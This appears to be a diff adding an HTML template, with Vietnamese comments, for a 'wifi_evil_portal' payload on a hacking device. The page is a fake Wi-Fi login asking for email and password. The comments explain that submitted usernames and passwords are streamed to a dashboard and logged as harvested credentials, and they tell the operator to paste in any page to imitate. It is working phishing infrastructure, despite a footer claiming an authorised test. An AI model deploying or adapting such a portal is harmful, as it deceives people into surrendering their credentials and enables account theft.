@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Đăng nhập Wi-Fi</title>
+  <!--
+    Trang mẫu cho payload `wifi_evil_portal` (PLAN §2.4).
+
+    Thiết bị phục vụ file này từ LittleFS khi payload đang chạy; sửa file rồi
+    `pio run -t buildfs && pio run -t uploadfs` để nạp lại. Trang phải tự
+    chứa (không tải tài nguyên ngoài — AP không có Internet), form POST về
+    chính nó. Bản dựng phải nhỏ hơn 16 KB.
+
+    Mỗi lần POST, payload giải mã các trường form và stream frame `evil_portal`
+    gồm `user`, `pass` (null nếu không có) và `body` thô; dashboard ghi
+    `Portal #n: <user> / <pass>` vào nhật ký (loại sự kiện "Thu thập").
+
+    Cách dùng: bỏ nội dung trang muốn dùng vào đây. Tên trường nhận dạng được
+    (không phân biệt hoa thường): email/user/username/login/account/phone/msisdn
+    và password/pass/pwd/passwd — còn tên khác vẫn được gửi nguyên body thô, nên
+    đừng đổi tên nếu muốn log hiện tên đăng nhập.
+  -->
+  <style>
+    :root { color-scheme: light; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      background: #eef1f5; color: #1f2933; padding: 24px;
+    }
+    .card {
+      width: 100%; max-width: 380px; background: #fff; border-radius: 14px; padding: 28px 24px;
+      box-shadow: 0 8px 24px rgba(15, 23, 42, .12);
+    }
+    .mark { display: flex; align-items: center; gap: 10px; margin-bottom: 18px; }
+    .dot { width: 14px; height: 14px; border-radius: 50%; background: #2f6fed; flex: none; }
+    h1 { font-size: 20px; margin: 0 0 4px; }
+    p.sub { margin: 0 0 20px; font-size: 14px; color: #5b6673; }
+    label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; }
+    input {
+      width: 100%; padding: 11px 12px; margin-bottom: 16px; font-size: 15px;
+      border: 1px solid #cbd2d9; border-radius: 8px; background: #fff;
+    }
+    input:focus { outline: 2px solid #2f6fed; outline-offset: 1px; border-color: #2f6fed; }
+    button {
+      width: 100%; padding: 12px; font-size: 15px; font-weight: 600; color: #fff;
+      background: #2f6fed; border: 0; border-radius: 8px; cursor: pointer;
+    }
+    button:active { background: #2559c4; }
+    .note { margin: 18px 0 0; font-size: 12px; color: #7b8794; text-align: center; }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <div class="mark"><span class="dot"></span><strong>Wi-Fi</strong></div>
+    <h1>Đăng nhập để tiếp tục</h1>
+    <p class="sub">Mạng này yêu cầu xác thực trước khi truy cập Internet.</p>
+
+    <form method="post" action="/">
+      <label for="email">Email hoặc tên đăng nhập</label>
+      <input id="email" name="email" type="text" autocomplete="off" autocapitalize="none"
+             autocorrect="off" spellcheck="false" required>
+
+      <label for="password">Mật khẩu</label>
+      <input id="password" name="password" type="password" autocomplete="off" required>
+
+      <button type="submit">Kết nối</button>
+    </form>
+
+    <p class="note">Bài tập thử nghiệm trong môi trường được phép.</p>
+  </main>
+</body>
+</html>
